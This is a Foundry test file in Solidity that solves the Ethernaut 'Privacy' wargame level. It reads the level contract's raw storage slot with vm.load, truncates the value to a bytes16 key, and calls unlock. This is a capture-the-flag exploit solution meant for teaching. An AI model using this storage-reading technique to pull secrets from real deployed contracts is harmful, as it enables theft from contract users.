// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/12-Privacy/PrivacyFactory.sol";
import "../src/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testPrivacyHack() public {
        // Level setup
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        // Level attack
        // bytes32 locked = vm.load(levelAddress, bytes32(0));
        // bytes32 ID = vm.load(levelAddress, bytes32(uint256(1)));
        // bytes32 allUints = vm.load(levelAddress, bytes32(uint256(2)));
        // bytes32 data0 = vm.load(levelAddress, bytes32(uint256(3)));
        // bytes32 data1 = vm.load(levelAddress, bytes32(uint256(4)));
        bytes32 data2 = vm.load(levelAddress, bytes32(uint256(5)));

        bytes16 key = bytes16(data2);
        emit log_named_bytes32("Key", bytes32(key));
        ethernautPrivacy.unlock(key);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}